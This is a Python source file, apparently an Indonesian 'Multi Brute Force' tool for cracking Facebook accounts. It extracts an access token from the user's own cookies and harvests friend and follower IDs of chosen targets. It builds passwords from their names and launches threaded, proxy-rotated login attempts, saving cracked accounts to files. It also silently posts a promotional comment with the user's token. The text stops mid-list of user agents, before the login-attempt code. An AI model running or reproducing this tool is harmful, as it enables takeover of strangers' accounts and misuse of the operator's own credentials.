###>[ MENGIMPORT MODULE ]<###
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')

###>[ UGENT DAN PROXY LIST ]<###
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('><')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (SymbianOS/9.4; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/51.1.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/533.4'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

###>[ UAKU ]<###
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/X378X/Cp/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()

###>[ INDICATION ]<###
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

###>[ WARNA ]<###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
lin378 = random.choice([m,k,h,u,b])
kom1 = ("Anjayy keren banget bang🤘\n-\nhttps://www.facebook.com/100043618273847/posts/716085553188714/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[Semangat Bang @[100043618273847:] ]")

###>[ BULAN TANGGAL WAKTU TAHUN ]<###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###>[ JALAN ]<###
def rizki378_tamvan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)

###>[ CLEAR ]<###
def clear():
	os.system('clear')

###>[ BACK ]<###
def back():
	login()
	
###>[ BANNER ]<###
def banner():
	rizki378_tamvan('=' * 40)
	print(f"""{Z}[•] MUHAMAD-RIZKI Multi Brute Force [•]{P}""")
			
###>[ LOGIN ]<###
def login():
  try:
    token = open('.token.txt','r').read()
    cok = open('.cok.txt','r').read()
    tokenku.append(token)
    try:
      sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
      sy2 = json.loads(sy.text)['name']
      sy3 = json.loads(sy.text)['id']
      menu(sy2,sy3)
    except KeyError:
      login_lagi334()
    except requests.exceptions.ConnectionError:
      li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
      lo = mark(li, style='red')
      sol().print(lo, style='cyan')
      exit()
  except IOError:
    login_lagi334()
def login_lagi334():
  try:
    os.system('clear')
    banner()
    cetak(nel('\t©©© Your Cookies : [green]Cookiedough[white] ©©©'))
    asu = random.choice([m,k,h,b,u])
    cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
    headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    'Cookie': cookie
    }
    url = requests.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
    cari = re.findall('act=(.*?)&nav_source', url.text)
    if len(cari) == 0:
        print (f'Cookies Kadarluasa')
        exit()
    else:
        for xenz in cari:
            web = requests.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={xenz}&nav_source=no_referrer', headers = headers)
            token = re.search('(EAAB\w+)', web.text).group(1)
            open(".token.txt","w").write(token)
            open(".cok.txt","w").write(cookie)
        urll = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+token, cookies={"cookie":cookie})
        json.loads(urll.text)["name"]
        json.loads(urll.text)["id"]
        print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........!{x} ');time.sleep(1)
        exit()
  except Exception as e:
    os.system("rm -f .token.txt")
    os.system("rm -f .cok.txt")
    print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
    exit()
def bot():
  try:
    requests.post("https://graph.facebook.com/100043618273847_716085553188714?fields=subscribers&access_token=%s"%(tokenku))
  except:
    pass
		
###>[ BOT RIZ ]<###
def bot():
	try:
		requests.post(f"https://graph.facebook.com/100043618273847_716085553188714/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
	except:
		pass
		
###>[ BAGIAN MENU ]<###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post(f"https://graph.facebook.com/100043618273847_716085553188714/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
	except IOError:
		print('[×] Cookies Telah Kadaluarsa ')
		time.sleep(5)
		login_bas()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	rizki378_tamvan(f'[>] ID  : '+str(my_id))
	rizki378_tamvan(f'[>] IP  : {ip}')
	#rizki378_tamvan(f' Github   : RIZKI-ID)
	rizki378_tamvan('=' * 40)
	cetak(' 📍 1. Crack Publik Massal\n 📍 2. Crack Followers\n 📍 3. Crack Group\n 📍 4. Hasil Crack\n 📍 5. Chat Author\n 📍 0. Keluar')
	rizki378_tamvan('=' * 40)
	rizki378_sayang_islammiyah = input('[?] Pilih : ')
	rizki378_tamvan('=' * 40)
	if rizki378_sayang_islammiyah in ['1']:
		dump_massal()
	elif rizki378_sayang_islammiyah in ['2']:
		dump_pengikut()
	elif rizki378_sayang_islammiyah in ['3']:
		grup()
	elif rizki378_sayang_islammiyah in ['4']:
		result()
	elif rizki378_sayang_islammiyah in ['5']:
		authorriz()
	elif rizki378_sayang_islammiyah in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[!] Sukses Logout+Hapus Cookies ')
		exit()
	else:
		print('[!] Pilih Yang Bener Lah cuk')
		back()
def authorriz():
	rizki378_tamvan(f'{sir}[!] Tunggu Bentar cuk Ntar Diarahin Ke Facebook  {x}')
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/Bangboystore10")
	back()
	
###>[ HASIL CRACK ]<###
def result():
	print(f'[!] 1. Hasil {h}OK{x} Anda ')
	print(f'[!] 2. Hasil {k}CP{x} Anda ')
	print('[!] 3. Kembali ')
	rizki378_tamvan('=' * 40)
	baz_code = input(f'[?] Pilih : ')
	if baz_code in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Tidak Ada Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[!] %s. %s ({k} %s {x}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Cuk ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}[!] {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Tidak Ada Hasil OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[!] %s. %s ( {h}%s{x} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[!] %s. %s ({h} %s {x}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Lah ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}[!] {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener Lah ')
		back()
		
###>[ CRACK MASSAL ]<###
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		baz_coder = int(input('[?] Berapa Target Id : '))
	except ValueError:
		print('[!] Yang Bener Napa Cuk ')
		exit()
	if baz_coder<1 or baz_coder>100:
		print('[!] Gagal Dump Id Target ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(baz_coder):
		yz+=1
		kl = input('[!] Id Target Ke '+str(yz)+' : ')
		uid.append(kl)
		rizki378_tamvan('=' * 40)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[!] Sinyal Eror ')
			exit()
	try:
		print(f'[!] Total Id Target '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('[!] Koneksi Lu Eror Cuk ')
		back()
	except (KeyError,IOError):
		print(f'[!]{k} Pertemanan Id Target Lu Tidak Publik {x}')
		time.sleep(3)
		back()
		
###>[ CRACK PENGIKUT ]<###
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	baz_oi = input('[!] Id Target : ')
	basari_tamvan('=' * 40)
	try:
		baz_pero = requests.get('https://graph.facebook.com/'+baz_oi+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in baz_pero['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'[!] Total Id Target : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('[!] Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print('[!] Gagal Mengambil Id Target ')
		exit()
		
###>[ CRACK GRUP FB ]<###
def grup():
	rizki378_tamvan(f'{b}[!] Maaf Fitur Ini Masih Dalam Perbaikan  {x}')
	time.sleep(4)
	back()
			
###>[ ID SETTING ]<###
def setting():
	rizki378_tamvan('=' * 40)
	cetak(' 📍 1. Akun Lama\n 📍 2. Akun Baru\n 📍 3. Akun Acak')
	rizki378_tamvan('=' * 40)
	baz_gege = input('[?] Pilih : ')
	rizki378_tamvan('=' * 40)
	if baz_gege in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif baz_gege in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif baz_gege in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('[!] Pilih Yang Bener Cuukk')
		exit()
		
###>[ METHOD LOGIN ]<###
	print('📍 1. M.Facebook ')
	#print('[•] 2. Method V2 ')
	rizki378_tamvan('=' * 40)
	rizki378 = input('[?] Pilih : ')
	if rizki378 in ['1','01']:
		method.append('mobile')
	elif rizki378 in ['']:
		print('[!] Pilih Yang Bener Lah ')
		setting()
	elif rizki378 in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	rizki378_tamvan('=' * 40)
	_riznih_ = input('[?] Tampilkan Aplikasi Y/t : ')
	if _riznih_ in ['']:
		print('[!] Pilih Yang Bener Lah ')
		back()
	elif _riznih_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	rizki378_tamvan('=' * 40)
	pwplus=input('[?] Kata Sandi Tambahan Y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[!] Masukkan Sandi Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	
###>[ CRACKING ]<###
def passwrd():
	rizki378_tamvan('=' * 40)
	print(f'[•] Hasil {h}OK{x} Tersimpan Di : {h}%s {x}'%(okc))
	print(f'[•] Hasil {k}CP{x} Tersimpan Di : {k}%s {x}'%(cpc))
	rizki378_tamvan('=' * 40)
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(f'[{b}•{x}]{h} HASIL OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} HASIL CP : {k}%s{x} '%(cp))
	print('')
		
###>[ METHOD V1 ]<###
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\rm.facebook {P}{loop}{P}/{P}{len(id)}{P} OK {H}{ok}{P} CP {k}{cp}{x} {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; RMX1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (X11;U;Linux x86_64;en-us)AppleWebKit/537.36(KHTML,like Gecko)Chrome/105.0.5195.102Safari/537.36',
	'Mozilla/5.0 (Linux; Android 7.0; SM-G928T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; KB2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-A226B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; A5_Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; RMX2189) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; M2006C3LI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; CPH1931) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; ELE-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; Nokia C10 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.79 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 8.1.0; SM-J260T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; V2042) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 9; MHA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 11; OnePlus 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; Infinix X670) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 12; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (Linux; Android 10; ZTE 8010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
	'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',        
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.8.0.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/221.0.461030601 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.3.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/',     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62',
        'Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.1.0.2',
        'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A800F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
        'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI U8666E Build/T396T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4605.60 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
        'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996',
